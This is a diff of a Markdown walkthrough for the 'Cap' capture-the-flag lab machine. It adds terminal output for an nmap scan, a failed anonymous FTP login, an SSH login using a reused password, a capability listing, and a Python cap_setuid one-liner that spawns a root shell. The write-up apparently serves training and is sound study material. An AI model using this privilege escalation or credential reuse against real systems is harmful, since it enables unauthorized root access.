@@ -42,6 +42,23 @@ nmap -vv -T5 -p21,22,80 -sC -sV 10.129.x.x
 ```
 
 **Results:**
+```bash
+# Nmap 7.94 scan initiated Sat Oct 25 16:50:00 2025 as: nmap -vv -T5 -p21,22,80 -sC -sV 10.129.x.x
+Nmap scan report for 10.129.x.x
+Host is up (0.045s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+|_http-title: Security Dashboard
+|_http-server-header: gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 | Port | Service | TCP/UDP |
 | ---- | ------- | ------- |
@@ -50,9 +67,9 @@ nmap -vv -T5 -p21,22,80 -sC -sV 10.129.x.x
 | 80   | HTTP    | TCP     |
 
 **Key findings:**
-- FTP open (vsftpd)
-- SSH open (OpenSSH)
-- HTTP server (Gunicorn)
+- FTP open (vsftpd 3.0.3)
+- SSH open (OpenSSH 8.2p1)
+- HTTP server running Gunicorn (Python-based WSGI server)
 
 ---
 
@@ -61,8 +78,16 @@ nmap -vv -T5 -p21,22,80 -sC -sV 10.129.x.x
 Checked for anonymous access, but it was disabled. Credentials are required.
 
 ```bash
-ftp 10.129.x.x
-# Anonymous login failed
+❯ ftp 10.129.x.x
+Connected to 10.129.x.x.
+220 (vsFTPd 3.0.3)
+Name (10.129.x.x:user): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp> quit
+221 Goodbye.
 ```
 
 ---
@@ -123,8 +148,24 @@ Found the user flag in `user.txt`.
 Since credentials are often reused, I tried logging into SSH with the same credentials.
 
 ```bash
-ssh nathan@10.129.x.x
-# Password: buckhead
+❯ ssh nathan@10.129.x.x
+nathan@10.129.x.x's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Oct 25 17:03:12 UTC 2025
+
+  System load:  0.0               Processes:             124
+  Usage of /:   35.6% of 9.78GB   Users logged in:       0
+  Memory usage: 22%               IPv4 address for eth0: 10.129.x.x
+  Swap usage:   0%
+
+0 updates can be applied immediately.
+
+nathan@cap:~$ 
 ```
 
 Successfully logged in as `nathan`.
@@ -140,7 +181,12 @@ Successfully logged in as `nathan`.
 Given the box name "Cap", I checked for Linux Capabilities.
 
 ```bash
-getcap -r / 2>/dev/null
+nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
 ![Pasted image 20251025170409.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170409.png)
@@ -160,7 +206,10 @@ Found `cap_setuid` set on the Python binary:
 Exploited the capability using Python to set the UID to 0 (root) and spawn a shell.
 
 ```bash
-/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@cap:~# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+root@cap:~#
 ```
 
 ![Pasted image 20251025170423.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170423.png)
